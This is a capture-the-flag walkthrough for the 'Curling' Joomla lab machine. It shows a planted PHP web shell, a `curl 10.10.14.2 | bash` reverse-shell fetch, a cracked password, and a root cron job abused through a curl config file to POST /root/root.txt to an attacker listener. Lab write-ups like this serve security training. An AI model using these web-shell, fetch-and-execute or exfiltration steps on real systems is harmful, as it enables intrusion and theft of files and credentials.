# Curling - Linux, easy (10.10.10.150)

### Enumeration
```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
```

Here we can check the version of Joomla!: http://10.10.10.150/administrator/manifests/files/joomla.xml
```
<extension version="3.6" type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<version>3.8.8</version>
<creationDate>May 2018</creationDate>
<description>FILES_JOOMLA_XML_DESCRIPTION</description>
<scriptfile>administrator/components/com_admin/script.php</scriptfile>
```

which is 3.8.8.

The website presents 3 posts and a login form.

Checking the posts, we can notice that they all are made by a user called "Super User", but the first post posted is signed by **Floris**, this can be a username.
Moreover, if we check the source code of index.php, in the bottom of the presented page there is an interesting comment:
```
</body>
      <!-- secret.txt -->
</html>
```

Checking page http://10.10.10.150/secret.txt, there is only the following string **Q3VybGluZzIwMTgh**.
Trying to decode it from base64 we obtain a possible password:
```
echo "Q3VybGluZzIwMTgh" | base64 -d
Curling2018!
```

So, now we can try to log in with credentials **Floris:Curling2018!**.
There's not much we can do in the website as user Floris, but with a previous gobuster scan we have obtained page **/administrator** which is essentially the interface where the admin and other site officials can manipulate the look of Joomla-powered websites.
We are presented with another login form, and trying the obtained credentials we are able to log in!

### Obtaining www-data
Since we were able to log in in the admin panel of Joomla, we can try to obtain a shell.
What we can do is, click in the top level bar `Extensions > Templates > Templates` and then click on the first presented template, which is **Beez3 Details and Files**.
Now open **index.php** and we can try to overwrite the content of the file and check if it is vulnerable and we can exploit it to obtain a shell.
Try with a simple print first `<?php echo "Hello" ?>` and check at **http://10.10.10.150/templates/beez3/index.php** if it prints "Hello".
Since it does, which means that the PHP file is working, we can enter a GET request via URL using the variable 'cmd' `<?php echo shell_exec($_GET['cmd']); ?>`.
And in the URL, add `?cmd=whoami` (http://10.10.10.150/templates/beez3/index.php?cmd=whoami).
Now we should see **Hello www-data**.

Now that we know we can execute some code, we can setup a python3 server and execute a GET request via URL with curl and bash.
In the URL add `?cmd=curl 10.10.14.2 | bash`, while the server is up and running on port 80 and a netcat session is listening on the port specified in the index.html that we made for our python3 sever.
Now we should see a shell spawning as user www-data.

Note that we could also just copy in the index.php file a php reverse shell instead of using the python3 server.

### www-data to Floris
In the home folder of user Floris we can see a file called **password_backup**, where the content seems like the output of command `xxd`:
```
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

Looking at the first 3 bytes, we can search on Google and see that **BZh** corresponds to **.bz2** files.

We can convert the bytes of the xxd output in the following way and copy the result in a bz2 file with `xxd -r password_backup > backup.bz2`.
Now we can decompress the file with `bzip2 -d backup.bz2`.
Checking the file that we obtained from the previous operation, we can notice that it is **gzip compresses data**, so we can decrompress it again using gzip, but first we need to change the extension to **.gz**.
Extract the data with `gunzip -k backup.gz`.
At this point, we obtained another .bz2 file, so we need to change its extension and decompress again using bzip2, but this point we obtain a tar archive.
Again, change the extension and decompress with `tar xvf backup.tar` to obtain a text file named **password.txt** that contains the following string: **5d<wdCbdZu)|hChXll**.

Assuming that this is the password corresponding to user Floris, we can try to escalate our privileges or connect using ssh.

### From Floris to Root
At this point we can access the first flag and a folder in the Floris' home called **/admin-area**.
This folder contains an ASCII text file named **input** and a HTML document named **report**.
Input contains just `url = "http://127.0.0.1"`.

Now we can upload **pspy** look for recurring jobs, and the result is the follwing:
```
2022/08/18 23:30:29 CMD: UID=0    PID=25426  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2022/08/18 23:30:29 CMD: UID=0    PID=25425  | sleep 1 
2022/08/18 23:30:29 CMD: UID=0    PID=25424  | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2022/08/18 23:30:29 CMD: UID=0    PID=25423  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2022/08/18 23:30:29 CMD: UID=0    PID=25421  | /usr/sbin/CRON -f 
2022/08/18 23:30:29 CMD: UID=0    PID=25420  | /usr/sbin/CRON -f
```

Option -K on curl allows the user to give arguments in a file that will be treated as if they were on the command line. The text file must have “Options and their parameters must be specified on the same line in the file, separated by whitespace, colon, or the equals sign”.
Options -o writes output to specified file (in this case /report).

To read the flag, we can change the **input** file to:
```
url = "http://10.10.14.2"
data = @/root/root.txt
```

where @ is used to reference a file, so that says use the content of root.txt as the POST data.

On the other side, we need to listen with `nc` and catch the POST request with the flag in the data:
```
listening on [any] 80 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.150] 42928
POST / HTTP/1.1
Host: 10.10.14.2
User-Agent: curl/7.58.0
Accept: */*
Content-Length: 32
Content-Type: application/x-www-form-urlencoded

a5c0f53ee4e153ea079b42772aef380d
```
